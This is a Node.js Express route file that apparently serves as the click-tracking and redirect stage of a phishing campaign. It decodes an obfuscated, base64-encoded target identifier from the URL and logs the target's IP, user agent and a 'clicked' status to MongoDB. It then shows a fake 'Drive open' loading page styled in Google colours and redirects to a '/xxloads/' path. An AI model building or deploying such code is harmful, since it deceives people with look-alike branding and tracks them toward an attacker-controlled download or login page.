
const express = require ('express');
const router = express.Router();
const db = require('../database');
router.use(express.static('public'));
const redirectUrl = "${url}";

//const fetch = require('node-fetch');



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {
    const data = req.query.eucnansxuhasehbcasdf;
    
    if (data == null) {
        res.render('error');
        
      }else{

    const userid = Buffer.from(data, 'base64').toString('utf-8');
  
  const word = 'clicked';
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
    // const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const pagetype = 0;
    const mobiletype = 0;
    const notify = 2;

// Using MongoDB to find the user
  db.mainCollection().then(collection => {
    collection.findOne({ username: userid })
      .then(result => {
        const rowCount = result ? 1 : 0;

         if (rowCount > 0) {

                // Update document in MongoDB
                collection.updateOne(
                  { username: userid },
                  { $set: { password: word, pagetype: pagetype, mobiletype: mobiletype, notify: notify } }
                )
                  .then(() => {
                    console.log('Record updated successfully');
                  })
                  .catch(err => {
                    console.error('Error updating record:', err);
                    return res.status(500).send('Internal Server Error');
                  });


        }else{

            // Insert document into MongoDB
            collection.insertOne({
              username: userid,
              password: word,
              ip: ip,
              useragent: useragent,
              date: date,
              notify: notify,
              pagetype: pagetype,
              mobiletype: mobiletype
            })
              .then(() => {
                console.log('Record inserted successfully');
              })
              .catch(err => {
                console.error('Error inserting record:', err);
                return res.status(500).send('Internal Server Error');
              });


        }
      })
      .catch(err => {
        console.error('Error executing MongoDB query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      });
  });
   
    const url = `/xxloads/?dhugfr8gwevdhweqvru3g284ge2378wudbwjb=${data}`;

   

    const htmlContent = `
            <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Drive open</title>
  <link rel="shortcut icon" href="./images/image.png" type="image">
  <style>
    /* --- Loader Overlay --- */
    #loader {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f0f4f9;
      z-index: 9999;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 3px solid transparent;
      border-top: 3px solid #4285f4;
      border-right: 3px solid #4285f4;
      border-radius: 50%;
      animation: spin 1.0s linear infinite, colorChange 1.8s linear infinite;
    }
    @keyframes spin { 
      0% { transform: rotate(0deg); } 
      100% { transform: rotate(360deg); } 
    }
    @keyframes colorChange {
      0% { border-top-color: #4285f4; border-right-color: #4285f4; }
      20% { border-top-color: #ea4335; border-right-color: #ea4335; }
      40% { border-top-color: #fbbc05; border-right-color: #fbbc05; }
      60% { border-top-color: #34a853; border-right-color: #34a853; }
      80% { border-top-color: #9c27b0; border-right-color: #9c27b0; }
      100% { border-top-color: #4285f4; border-right-color: #4285f4; }
    }
  </style>
</head>
<body>

  <!-- Loader -->
  <div id="loader">
    <div class="spinner"></div>
  </div>

  <script>
    // Change this to your target URL
    const url = "${url}";

    // Redirect after 3 seconds
    setTimeout(() => {
      window.location.href = url;
    }, 800);
  </script>
</body>
</html>

`;
    res.send(htmlContent);
}

});



module.exports =router;
